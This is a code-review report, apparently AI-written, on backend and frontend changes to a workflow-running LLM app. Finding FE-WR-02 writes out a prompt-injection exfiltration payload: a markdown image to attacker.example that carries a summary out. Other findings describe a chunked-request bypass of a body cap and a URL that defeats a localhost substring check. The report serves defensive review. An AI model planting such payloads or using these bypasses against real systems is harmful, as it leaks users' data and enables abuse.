---
phase: 296-close-v4-7-debt
reviewed: 2026-10-27
depth: standard
diff_base: 27f1cdf9b33b1f6f76e1963fd746e84bbff2840e
files_reviewed: 111
status: issues_found
independent_review: self
findings:
  critical: 2
  warning: 9
  info: 10
  total: 21
parts: [296-REVIEW-part-backend.md, 296-REVIEW-part-frontend.md]
---

# Phase 296 code review (combined)

Two fresh-context `gsd-code-reviewer` passes over the 111 non-test source files in `27f1cdf9b..HEAD`
(all 84 commits are phase 296), split backend+scripts+migrations (57) / frontend (54). IDs carry a
`BE-` / `FE-` prefix here; the part files keep the reviewers' own numbering.

## Triage (orchestrator)

| ID | Severity | Disposition |
|---|---|---|
| BE-CR-01 | critical | **CONFIRMED LIVE** (board `--resume-model`: 5 FAIL, only the owner's default provider passed) → fixed `d34d1b115` (RED) + the following fix commit; board re-run owed |
| FE-CR-01 | critical | pending — drive G-4 row 11 first (a review is a claim about code) |


# Part 1 — backend, scripts, migrations


# Phase 296: Code Review Report (backend half)

**Reviewed:** 2026-10-27
**Depth:** standard (diff-scoped: `git diff 27f1cdf9b..HEAD -- <file>`, plus the called code each change relies on)
**Files Reviewed:** 57
**Status:** issues_found

## Summary

The backend, scripts and migrations 215/216 were reviewed with weight on tenancy, SECURITY DEFINER
posture, run lifecycle / resume races, cross-provider routing, inbound caps, and scripts touching
non-local hosts. The test suite was not run (another process holds the local-DB lock). Every finding
below was traced through the called code. None is pattern-matched only.

**Verified sound (no finding):**
- **Migration 216.** `CREATE OR REPLACE` keeps the mig-181 ACL. The `REVOKE ... FROM PUBLIC` lines stand in
  `full-schema.sql:11013`. `organizations.name` has no unique constraint, so a constant name cannot
  collide (only `slug` is UNIQUE, and it is NULL here). The supplement copy changed in the same commit.
  No backend path still builds an org name from an email.
- **Migration 215 regex narrowing.** Correct.
- **Org stamping.** `create_folder` and `create_draft` stamp only a membership-validated org
  (`resolve_active_org_or_none`). The RLS INSERT policies re-check `org_id IN current_user_org_ids()`.
  `autofill_org_id_by_owner` keeps an explicit value.
- **Evidence D-05 cascade and the canonical-UUID filter.** Both are correct and fail closed.
- **Citation rate limit.** It sits before the in-flight claim, and it fails closed when Redis is down.
- **Download token.** The peek-then-consume uses an atomic GET+DEL and compares the value.
- **API keys.** The `revoked_now` audit dedupe and the `create_key` "offered" check are correct.
- **`forced_emit` `active_provider` copy (293-F-4).** Correct for the cloud-key branch.
- **`check-migration-216-live.py`.** Refuses a non-local host.
- **`run-296-board.py`.** Its DB and Redis guards are correct (but see BE-WR-05).

**The main problem:** the SEED-362 resume fix (BE-CR-01) records the run's provider and model but leaves the
re-driven ctx on the owner's default-provider settings. A resumed run started on any non-default
provider now sends the run's model through the wrong provider. This has not been driven live: the board
evidence ran against a backend that predates 296-06, so `metadata.provider` was null.

## Narrative Findings (AI reviewer)

## Critical Issues

### BE-CR-01: A resumed run sends its own model through the owner's default provider (SEED-362 regression)

**File:** `backend/app/services/harness_engine.py:2589-2606` (also reached from `backend/app/api/runs.py:766` through the answer re-drive)

**Issue:**
- 296-06 makes every in-app kickoff record `metadata.provider = _resolved_provider` (`threads.py:2089`).
- On resume, `_build_resume_context` then sets `ctx.model = run["model"]` and `ctx.provider = _run_provider`.
- But `ctx.user_settings` is still `_owner_settings` from `load_user_settings(owner)`. Its
  `active_provider`, `llm_api_key`, `llm_base_url` and `available_models` belong to the owner's default
  provider.
- The live kickoff does not do this. It runs `override_provider(user_settings, resolved_provider)`
  (`run_model_resolution.py:~279`), so live settings, model and provider agree. On resume they disagree.

How each step type routes on resume:
- **`llm_single`** calls `task_service._stream_one_iteration(model=ctx.model, user_settings=ctx.user_settings, provider=None)`.
  The route key falls back to `user_settings.active_provider` (`task_service.py:257`), and the key comes
  from the owner's settings.
- **`llm_agent`** goes through `_resolve_sub_agent_effective_model(settings, ctx_model)`, which keys on
  `user_settings.active_provider`. It silently swaps back to the owner's provider, so SEED-362 is still
  not met for agent steps.
- **Only `llm_emit`** reads `ctx.provider`.

**Failure scenario:**
1. The owner's default is OpenAI. A user picks a Claude model in the composer and starts a workflow:
   step 1 `llm_human_input`, step 2 `llm_single`.
2. They answer the pause.
3. `_redrive_paused_workflow_run` → `_build_resume_context` sets `ctx.model = "claude-…"` with
   OpenAI `user_settings`.
4. Step 2 is routed with `_provider = "openai"`. The adapter provider then comes from the registry
   (`anthropic`), but the settings carry the OpenAI key and base URL.
5. The call returns 401/404 and the run fails after the person answered. This is the
   `6eab949f` repro shape that `run_model_resolution.py` documents ("claude model + openai default
   active_provider → routed to OpenAI SDK → 404").

Before 296, the resume used the owner-default model, so it was wrong-provider but working.

This is exactly the board's own `--resume-model` workflow (`_resume_def`: human ask, then `llm_single`).
It read PASS only because the live backend predated 296-06 and recorded no provider
(`296-05-SUMMARY.md:137`).

**Fix:** align the settings with the recorded provider, as the live kickoff does:
```python
from app.models.user_settings import override_provider
if _run_provider and _owner_settings is not None:
    _owner_settings = override_provider(_owner_settings, _run_provider)
# then resolve _ctx_model as now, and pass user_settings=_owner_settings
```
- `override_provider` returns the settings unchanged when the provider has no key. In that case, fall
  back to `resolve_sub_agent_model_safely`, never the raw recorded model.
- Add a unit test that asserts `ctx.user_settings.active_provider == ctx.provider` on resume.
- Then re-run `run-296-board.py --resume-model` against a restarted backend.

## Warnings

### BE-WR-01: The boot sweep's human-input arm takes the run's latest prompt, which may belong to an earlier step

**File:** `backend/app/services/harness_engine.py:2766-2772, 2816-2818`; guard at `backend/app/services/harness/human_input.py:195`

**Issue:**
- Arm 2c takes the run's latest `ask_user_prompt` (`get_pending_ask_user`, which is
  `ORDER BY created_at DESC LIMIT 1` over every prompt of the run, answered or not).
- If that prompt was answered, it sets `ctx.resume_answered_tool_call_id` to its id.
- Nothing checks that the prompt belongs to the active step. The executor's own comment says this flag
  must be "NEVER A 'LATEST PROMPT' LOOKUP" (`human_input.py:171-176`).
- The only backstop is `_answers_this_step`, which compares prompt text.

**Failure scenario:**
1. A review workflow has step 1 "Approve this draft?" (answered) and step 3 "Approve this draft?".
2. The server restarts after step 3 becomes active but before its prompt row is inserted. That insert is
   explicitly best-effort (`human_input.py` "a failed insert only affects the /pending replay"), so
   this also happens whenever that insert failed.
3. The sweep finds step 1's answered prompt and sets the flag.
4. Step 3 consumes step 1's answer: a silent approval nobody gave.

**Fix:** only accept a prompt created during the active phase. For example, add
`AND m.created_at >= <active phase started_at>` (or match a stored phase slug in the prompt's
`tool_calls`). Otherwise leave `_hi_tcid = None` so the ordinary re-drive asks once.

### BE-WR-02: The inbound body cap is bypassed by a chunked request

**File:** `backend/app/api/inbound.py:83-101`

**Issue:**
- `_BodyCapRoute` refuses only when a `Content-Length` header is present and too large.
- A request sent with `Transfer-Encoding: chunked` has no `Content-Length`, so it "passes untouched".
- uvicorn (h11/httptools) accepts chunked request bodies. FastAPI then reads and JSON-parses the whole
  body before any dependency runs, including the IP limiter.
- No other body limit exists in `backend/app`. The onebox nginx allows 100 MB
  (`frontend/nginx.conf:8`), and a direct Coolify backend has no limit.

**Failure scenario:** an unauthenticated client streams an arbitrarily large chunked JSON body to
`POST /inbound/.../runs`, and the worker buffers all of it in memory. 293-BE-IN-03 is closed only for
well-behaved clients.

**Fix:** enforce the cap on the received stream, not on the header. Wrap `request.receive` (or use a
small ASGI middleware scoped to `/inbound`) so it counts bytes and returns 413 once
`INBOUND_MAX_BODY_BYTES` is exceeded. Keep the `Content-Length` fast path.

### BE-WR-03: `needs_typed_task` refuses workflows that need no typed task

**File:** `backend/app/services/inbound_inputs.py:130-135`; used by `api/api_keys.py:103,236,314` and `validate_inbound_inputs:194`

**Issue:**
- `needs_typed_task` returns `not fields`, where `fields = declared_fields(...)`. `declared_fields`
  already drops `kb_auto` inputs and reserved keys.
- The docstring says this mirrors the browser's `entryInputFields` kickoff fallback. It does not:
  `entryInputFields` (`soulData.ts:254-278`) falls back to `kickoff_prompt` only when `inputs[]` is
  empty. A workflow whose only inputs are Look-it-up (`kb_auto`) inputs gets no kickoff box in the
  browser and starts without a typed task.

**Failure scenario:** a published workflow whose inputs are all `source: kb_auto`:
- It is greyed out in the key picker as "needs_task".
- `create_key` refuses it with "starts from a typed task, which a key can't send yet". That is false.
- An existing key naming it reads `needs_task`, and an inbound start returns `needs_task`.

**Fix:** classify on the raw `inputs[]` / `input_keys` being empty, not on the filtered launch fields.
```python
def needs_typed_task(definition) -> bool:
    raw = ...  # decode as declared_fields does
    return not (raw.get("input_keys") or raw.get("inputs"))
```
Callers then pass the definition, or a pre-filter flag.

### BE-WR-04: The reconciler still ends a crash-finished branched run as `failed`

**File:** `backend/app/services/run_reconciler.py:300-304, 329-330`

**Issue:**
- `all_completed` counts only `completed` / `recorded_not_sent` steps.
- A `skip_to_phase` route marks a step `skipped` (`db/workflows.py:2057`, `harness_engine.py:1994`).
- The engine treats `skipped` as done (`harness_engine.py:1561`). The reconciler's own WHERE treats it
  as terminal (`_TERMINAL_PHASE_STATUSES`).

**Failure scenario:** a branched workflow finishes every step, with one `skipped`. The worker dies
before `finish_run`. The reconciler then ends the run `failed` with "Finalised by the reconciler" and
writes a `run_failed` audit, although the deliverable exists. That is the exact defect 295-BE-IN-02 / 296-02
set out to remove, still open for every branched workflow.

**Fix:** `AND wp.status NOT IN ('completed', 'recorded_not_sent', 'skipped')`, while requiring at least
one `completed` step so an all-skipped run is not called completed.

### BE-WR-05: `run-296-board.py` sends its writes to an unguarded API host

**File:** `scripts/run-296-board.py:641-642` (guards); `scripts/conc_probe.py:241-242` (`base_url`)

**Issue:**
- The board's write modes create threads, workflow definitions and live provider runs through
  `kit.base_url()`, which is `os.getenv("EVAL_BASE_URL", "http://127.0.0.1:8000")`.
- None of the three guards checks it. `assert_localhost_only` checks `SUPABASE_URL`, and
  `_assert_local_db` checks the DSN and Redis.
- `assert_localhost_only` is also a substring `search` for `localhost|127.0.0.1`, so
  `https://<prod>.supabase.co/?x=localhost` passes it.

**Failure scenario:** with `EVAL_BASE_URL` left pointing at a staging or prod backend (it is the eval
harness's documented override), `--first-step`, `--multi-tool`, `--pinned-emit` and the other write
modes POST real runs there, carrying a bearer token minted for the local test user. The phase brief says
scripts touching non-local hosts must refuse.

**Fix:** in `main()`, after `load_env()`:
```python
from urllib.parse import urlparse
if urlparse(kit.base_url()).hostname not in {"127.0.0.1", "localhost"}:
    raise SystemExit("REFUSING: EVAL_BASE_URL is not 127.0.0.1/localhost")
```
Also tighten `assert_localhost_only` to `urlparse(url).hostname in {...}`.

### BE-WR-06: `create_folder` still makes blocking supabase-py calls on the event loop (the rewritten insert included)

**File:** `backend/app/api/folders.py:80, 95`

**Issue:**
- 296-01 rewrote the folder INSERT (`result = supabase.table("folders").insert(row).execute()`) and left
  it, and the duplicate-name check above it, as synchronous `.execute()` calls inside `async def`.
- This breaks D-v2.5-01 ("wrap with `run_in_threadpool`"). Under `WORKER_COUNT=2` a slow PostgREST
  round-trip stalls every stream on that worker.
- The module already imports `run_in_threadpool`, and the codebase has `aexec`.

**Fix:** `await aexec(supabase.table("folders").insert(row))` and
`await aexec(name_check_query.maybe_single())`.

## Info

### BE-IN-01: `recording_by_design` reads the `live_connectors` audience without a freshness check

**File:** `backend/app/services/harness/validator_kinds.py:250-262`

The external-action executor runs `await ensure_settings_fresh()` before
`feature_audience("live_connectors")` (`phase_types.py:2738`). That was the BE-CR-03 fix for a flipped flag
still reading as on. The judge-side twin reads the cache directly. If the switch changes inside the
cache TTL, the judge can be told a recording was by design while the executor recorded it for a missing
grant, or the reverse. **Fix:** `await ensure_settings_fresh()` before the read, or pass the executor's
decision through the output.

### BE-IN-02: The baseline gate's path detection misses common path spellings, and `--json` gets no JSON on a gate error

**File:** `scripts/check-backend-unit-baseline.cjs:164-167, 210-215`

- `/^tests([\\/]|$)/` does not match `./tests/unit/x.py` or `backend/tests/...`. Those runs silently get
  `tests/unit` prepended and run the whole gated set plus the file.
- The new fail-closed branch exits 2 before any JSON is written, so a `--json` consumer sees no
  document.

**Fix:** normalise a leading `./` / `backend/`, and emit `{"error": ...}` in JSON mode.

### BE-IN-03: The golden run gives Look-it-up and file inputs a text stand-in, and the publish note names them

**File:** `backend/app/services/harness/publish_service.py:1550-1585`

`golden_run_inputs` loops over every `definition.inputs` entry, including `source: kb_auto` and
`type: file`. It assigns `"a short example answer"` and adds the label to `stood_in`. The publish
note then says "The practice run had no example for <Look-it-up input>". That is misleading, because a
Look-it-up input is never asked for (the overlay and `launch_kickoff` both skip it). **Fix:** skip
`source != "user"` (and `type == "file"`) when building the stand-ins and the note.

### BE-IN-04: `inline_refs` raises a bare `ValueError` on a recursive `$ref`

**File:** `backend/app/services/provider_gateway/schema_moonshot.py:61-66`

On a Moonshot endpoint, every tool's `parameters` goes through `inline_refs`. That includes
connector/MCP tools, whose schemas are authored externally. One recursive schema (a tree or comment
thread) raises `ValueError` inside `open_openai_compat_stream`, which is not a provider-shaped error.
**Fix:** on a cycle, return that tool unchanged (or drop that one tool with a logged warning) instead of
raising for the whole request.

---

_Reviewed: 2026-10-27_
_Reviewer: Claude (gsd-code-reviewer)_
_Depth: standard_


# Part 2 — frontend


# Phase 296: Code Review Report (frontend half)

**Reviewed:** 2026-10-27T01:23:36Z
**Depth:** standard (diff `27f1cdf9b..HEAD`, read against the code it calls)
**Files Reviewed:** 54
**Status:** issues_found

## Summary

I reviewed every frontend file on the scope list against its 296 diff, and followed the calls
across modules where a change relies on them: `sendMessage`'s refusal arms and `MessageInput`'s
prefill effect, `useDraftPersistence.saveNow` / `performWrite`, `MarkdownRenderer`,
`PhaseCard`'s `isRunning` consumers, the backend wire models for `outcome`, `needs_task`,
`unplaced_sentences`, `covered_by` and `auto_answered`, and the backend rerank alias table.

Most of the phase holds up when traced:
- The D-09 controlled `view` / `onViewChange` pair falls back to local state when absent, and the team branch in the canvas returns early.
- `engineFor` returning `null` is handled at every caller.
- The wire types match the backend models.
- `splitTemplateBind` is applied at both `uploadWorkflowTemplate` callers.
- The generated-draft `saveNow` reaches the create branch, and its `onDraftCreated` → `bindHeldTemplate` path works as intended.
- The `newestAskPerRun` dedupe keys on `workflow_run_id`, which stays the same across resumes, so it collapses the re-asked prompts.

**FE-CR-01 is the important finding.** The in-thread workflow-start fix (287-FE-WR-02) is supposed to keep the kickoff text out of the composer. In the real mount it does not: a 422 or 400 refusal still puts `Run <workflow>` into the composer. React flushes the provider's failed-draft write, and `MessageInput`'s prefill effect copies it, before the hook gets a chance to clean the draft up. The hook's test checks only the store, so it cannot see this.

## Critical Issues

### FE-CR-01: A refused in-thread start still puts "Run <workflow>" into the composer (287-FE-WR-02 not closed in the live mount)

**File:** `frontend/src/components/chat/useStartWorkflowInThread.ts:96-114` (cooperating with `frontend/src/providers/StreamsProvider.tsx:3306-3312` and `frontend/src/components/chat/MessageInput.tsx:384-389`)

**Issue:** The hook assumes it can take over the provider's refusal before anything renders. It cannot. Here is the trace for a kickoff the server refuses with 422 (or 400, or any 409 that does not carry the lock prefix):

1. `sendMessage`'s generic `ApiError` arm runs `useStreamsStore.setState({ reconcileErrors: …, failedSendDrafts: …set(threadId, "Run X") })` (StreamsProvider.tsx:3309-3312).
2. That write notifies `useFailedSendDraftForThread` in `ChatArea` (ChatArea.tsx:170). Zustand 5 subscribes through `useSyncExternalStore`, so React 19 schedules a SyncLane render on a microtask, queued now.
3. `sendMessage` runs its `finally` block, which does more synchronous setState calls and no await, and then returns. Only now does its promise resolve and queue the hook's `.then` reaction.
4. Microtasks run in order, so React renders first. `ChatArea` passes `prefillMessage={failedDraft ?? …}` (ChatArea.tsx:879). For a SyncLane commit, React flushes passive effects synchronously, so `MessageInput`'s effect runs `setValue("Run X")` and then `onClearPrefill()`.
5. Only then does the hook's `.then` / `.catch` delete `failedSendDrafts[threadId]`. Deleting the draft never clears the composer, because the effect writes only when `prefillMessage` is truthy. The composer keeps `Run X`, and the banner for the `reconcileErrors` entry flashes for one frame.

The result: the person sees the worded failure under the picker, and also finds `Run <workflow>` in the composer. Pressing Enter sends it as an ordinary Deep message, which is exactly what the comments at `composerCopy.ts:110-114` and `useStartWorkflowInThread.ts:88-90` say cannot happen. The new suite (`useStartWorkflowInThread.test.tsx:152-165`) checks the store map after the promise settles and never mounts `ChatArea` or `MessageInput`, so it passes while the defect ships.

**Fix:** Stop the provider from stashing a draft for a kickoff, rather than undoing the stash afterwards. One guard in the existing arm does it (a G-5 one-touch):
```ts
// StreamsProvider.tsx generic ApiError arm
useStreamsStore.setState((s) => ({
  reconcileErrors: new Map(s.reconcileErrors).set(threadId, err),
  // A kickoff's text is not the person's: never offer it back to the composer.
  ...(opts?.workflowDefinitionId
    ? {}
    : { failedSendDrafts: new Map(s.failedSendDrafts).set(threadId, content) }),
}))
```
After that change the hook must detect its refusal by the `reconcileErrors` identity change alone, or better, receive the error directly through an `onRefused` option on `sendMessage`. Then add a test that mounts `ChatArea` with the real store and asserts the composer `textarea` is empty after a 422 kickoff.

## Warnings

### FE-WR-01: A paused run's step reads "! Waiting" next to a pulsing "Working" line and a "<slug> running" progress bar

**File:** `frontend/src/components/panel/PhaseCard.tsx:455-459, 682-692, 742-750` (with `phaseStatusMeta.ts:305` and `PhaseTimeline.tsx:253`)

**Issue:** `runPaused` changes only the status text, through `statusMetaForRun`. `isRunning` is still `phase.status === "running" && runLive !== false`, and a paused run is not terminal, so `runLive` is true. So for 295-D-uat-02, the case this change targets, the card renders all of these at once:
- `! Waiting` in amber;
- an indeterminate progress bar whose accessible name is `"<slug> running"`;
- the activity line `● Working` with a pulsing dot;
- `aria-busy="true"` on the region.

The card is saying *Waiting* and *Working* about the same step at the same moment, and assistive tech hears "running". UI-SPEC row 4 says the step reads `! Waiting`, and this contradicts it.

**Fix:** Fold `runPaused` into the liveness reading the card already derives, so the instruments follow the status:
```ts
const isRunning = phase.status === "running" && runLive !== false && runPaused !== true
```
Check the forced-open accordion behaviour, which also keys on `isRunning`. If the paused step should stay open, keep a separate `forcedOpen = phase.status === "running" && runLive !== false`.

### FE-WR-02: The evidence report now renders step output as HTML, so colleagues' browsers load remote images an LLM wrote

**File:** `frontend/src/components/workflows/RunEvidenceReport.tsx:339-341` (renderer: `frontend/src/components/chat/MarkdownRenderer.tsx:22-30`)

**Issue:** 289-F-B swapped the plain-text `whitespace-pre-wrap` output for `MarkdownRenderer`, which is `marked` plus `DOMPurify.sanitize` with default settings. DOMPurify's default allow-list keeps `<img src="https://…">` and `<a href="https://…">`. Step output is model-written and often derived from retrieved documents or connector content. That makes it a known prompt-injection target: a planted `![](https://attacker.example/p?d=<summary>)` becomes an image request sent automatically the moment the page renders.

Before 296 this page showed text only. The audience is the reason it matters here: the evidence report is the surface built for same-org **colleagues** (D-05 / 289 R-04). A non-owner opening the record now fires that request from their own browser, with no click, carrying whatever the model put into the URL. Chat already has this behaviour for the owner. 296 extends it to a wider audience on the page that carries the privacy boundary.

**Fix:** For this surface, either keep plain text, or sanitise with remote media forbidden:
```ts
DOMPurify.sanitize(html, { FORBID_TAGS: ["img", "picture", "source", "video", "audio", "iframe"], FORBID_ATTR: ["srcset"] })
```
To do that, give `MarkdownRenderer` an optional `noRemoteMedia` prop. Consider also adding `rel="noopener noreferrer"` to links through a DOMPurify `afterSanitizeAttributes` hook.

### FE-WR-03: A 409 "can't check here" now prints the same sentence twice on the message that asked

**File:** `frontend/src/stores/citationCheckStore.ts:136-144` (rendered by `frontend/src/components/chat/CitationCheckAction.tsx:70-76, 117-121`)

**Issue:** On a 409 with reason `off`, `key_missing` or `engine_reorders_only`, `run()` now sets two things:
- the shared `availability = { available: false, reason }`;
- `errors[id] = code`.

`CitationCheckAction` then renders `availabilityReason(availability)` in place of the button (ⓘ, muted), and also `checkErrorLine(errorCode)` underneath (red, `role="status"`). `checkErrorLine` maps those three codes to the same strings `availabilityReason` returns (`OFF_LINE`, `REORDERS_ONLY_LINE`, `keyMissingLine`). The asking message therefore shows one sentence twice in two tones, and screen readers announce it again. Every other message shows it once.

**Fix:** When the code is one of `UNAVAILABLE_REASONS`, update availability only and do not record a per-message error:
```ts
set((s) => reason
  ? { availability: { available: false, engine: s.availability?.engine ?? null, reason } }
  : { errors: { ...s.errors, [id]: code } })
```

## Info

### FE-IN-01: A non-lock 409 is always worded "A workflow is already running in this thread"

**File:** `frontend/src/components/chat/useStartWorkflowInThread.ts:19-25`

**Issue:** `failureFor` maps every 409 to `startLocked`. The send path has other 409s: the paused-workflow refusal (`workflow_kickoff.py:176-183`, "…paused, waiting for your answer. Answer it in the panel…") and the Expert/thread org mismatch (`threads.py:837`). The first loses the one fact that tells the person where to go next. The second is false. Both are rare, because the picker is disabled while the lock is set.

**Fix:** Key `"locked"` on the lock arm only, for example the provider's lock sentence or a `kind` the provider records. Let other 409s fall to `startFailed`, or to a paused-specific line.

### FE-IN-02: The availability read is retried immediately, with no backoff, whatever the error

**File:** `frontend/src/stores/citationCheckStore.ts:96-97`

**Issue:** `.catch(() => getCitationChecks(chunk))` re-sends the GET in the same tick for any error, including 401, 429 and 404, where an instant retry cannot succeed and only doubles the load.

**Fix:** Retry only on network errors and 5xx, after a short delay (for example 500 ms).

### FE-IN-03: Two doc comments were orphaned by insertions above them

**File:** `frontend/src/stores/citationCheckStore.ts:66-67`, `frontend/src/components/chat/artifacts/diagramLayout.ts:104-105`

**Issue:** `/** A fixed code for a failed POST… */` now sits directly above `UNAVAILABLE_REASONS`, which has its own comment, and `errorCodeOf` has none. `/** Step 1: which edges are back edges… */` now documents `LABEL_HEIGHT` instead of `findBackEdges`. IDE hovers show the wrong text.

**Fix:** Move each comment back above the function it describes.

### FE-IN-04: The disabled Word-blank ticks do not say why they are disabled

**File:** `frontend/src/components/workflows/DescribeTemplateRow.tsx:476-481`

**Issue:** The picker and the Clear button carry `aria-describedby={disabledNoteId}` while composing, but the blank checkboxes get only `disabled`. A screen-reader user hears them as unavailable with no reason, unlike the sibling controls (UI-SPEC 291-FE-WR-01: "say why").

**Fix:** Spread `{...lockedBy}` onto the checkbox as well.

### FE-IN-05: The "Look it up isn't available" note renders even when no row has a switch

**File:** `frontend/src/components/workflows/DraftInputsFold.tsx:205-208`

**Issue:** The note is rendered unconditionally. When every row is `step` or `blank`, it describes a control that is not on screen.

**Fix:** Render it only when `rows.some((r) => r.source !== "step" && r.source !== "blank")`.

### FE-IN-06: The Team view's scroll region and its figure have the same accessible name

**File:** `frontend/src/components/workflows/TeamPicture.tsx:467, 485-487`

**Issue:** The new `role="region"` gets `aria-label={teamFigureLabel(workflowName)}`, and the `<figure>` inside it carries the same label. Screen readers announce "Team picture for X" twice in a row.

**Fix:** Give the region a distinct name, for example `"Team picture, scrollable"`, or point it at the figure with `aria-labelledby` and drop the figure's own label.

---

_Reviewed: 2026-10-27T01:23:36Z_
_Reviewer: Claude (gsd-code-reviewer)_
_Depth: standard_
